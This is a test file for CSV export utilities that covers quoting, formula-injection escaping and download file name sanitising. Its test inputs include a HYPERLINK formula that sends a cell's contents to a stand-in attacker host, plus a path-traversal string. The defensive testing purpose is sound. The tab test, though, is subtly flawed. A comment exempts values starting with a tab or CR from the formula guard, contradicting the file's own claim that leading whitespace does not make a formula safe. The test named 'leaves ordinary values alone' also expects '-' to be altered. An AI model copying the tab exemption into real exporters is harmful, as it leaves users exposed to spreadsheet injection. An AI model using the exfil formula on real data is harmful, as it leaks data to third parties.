import { describe, expect, it } from 'vitest'
import {
  buildCsv,
  escapeCsvField,
  sanitizeDownloadFileName,
  toCsvRow
} from '@/utils/csv'

describe('escapeCsvField', () => {
  it('quotes every value and doubles inner quotes', () => {
    expect(escapeCsvField('plain')).toBe('"plain"')
    expect(escapeCsvField('a,b')).toBe('"a,b"')
    expect(escapeCsvField('say "hi"')).toBe('"say ""hi"""')
    expect(escapeCsvField('line1\nline2')).toBe('"line1\nline2"')
  })

  it('renders empty for null and undefined', () => {
    expect(escapeCsvField(null)).toBe('""')
    expect(escapeCsvField(undefined)).toBe('""')
    expect(escapeCsvField(0)).toBe('"0"')
  })

  it('neutralises formula-shaped values', () => {
    // A user name like this turns into a live link when the export is opened.
    expect(escapeCsvField('=HYPERLINK("http://attacker/?x="&A1,"click")')).toBe(
      '"\'=HYPERLINK(""http://attacker/?x=""&A1,""click"")"'
    )
    for (const dangerous of ['=1+1', '+1', '-1', '@SUM(A1)', '\0cmd']) {
      expect(escapeCsvField(dangerous).startsWith('"\'')).toBe(true)
    }
    // A tab or CR at the start is leading whitespace, which the spreadsheet ignores
    // before deciding "formula"; stripping it makes the value plain text, so the
    // guard is not needed (and the tab stays part of the quoted field).
    expect(escapeCsvField('\tcmd')).toBe('"\tcmd"')
    // Leading whitespace does not make a formula safe.
    expect(escapeCsvField('   =1+1')).toBe('"\'   =1+1"')
    // Full-width look-alikes are normalised by some spreadsheet locales.
    expect(escapeCsvField('＝SUM(A1)')).toBe('"\'＝SUM(A1)"')
  })

  it('leaves ordinary values alone', () => {
    expect(escapeCsvField('alice@example.com')).toBe('"alice@example.com"')
    expect(escapeCsvField('-')).toBe('"\'-"')
    expect(escapeCsvField('a-b')).toBe('"a-b"')
    expect(escapeCsvField(2024)).toBe('"2024"')
  })
})

describe('toCsvRow and buildCsv', () => {
  it('joins escaped fields with commas', () => {
    expect(toCsvRow(['a', 'b,c', 'd"e'])).toBe('"a","b,c","d""e"')
  })

  it('separates rows with CRLF and prefixes a BOM', () => {
    const csv = buildCsv([['a'], ['b']])
    expect(csv).toBe('\uFEFF"a"\r\n"b"')
    expect(buildCsv([['a']], { bom: false })).toBe('"a"')
  })

  it('escapes header cells as well', () => {
    expect(buildCsv([['=header'], ['value']], { bom: false })).toBe(
      '"\'=header"\r\n"value"'
    )
  })
})

describe('sanitizeDownloadFileName', () => {
  it('replaces path separators and control characters', () => {
    expect(sanitizeDownloadFileName('a/b\\c:d*e?f"g<h>i|j')).toBe('a-b-c-d-e-f-g-h-i-j')
    expect(sanitizeDownloadFileName('name\u0000with\u001fcontrols')).toBe('namewithcontrols')
  })

  it('removes traversal sequences and leading dots', () => {
    expect(sanitizeDownloadFileName('../../etc/passwd')).toBe('etc-passwd')
  })

  it('falls back when nothing usable is left', () => {
    expect(sanitizeDownloadFileName('', 'export.csv')).toBe('export.csv')
    expect(sanitizeDownloadFileName('...', 'export.csv')).toBe('export.csv')
  })

  it('caps the length', () => {
    expect(sanitizeDownloadFileName('x'.repeat(500)).length).toBe(120)
  })
})
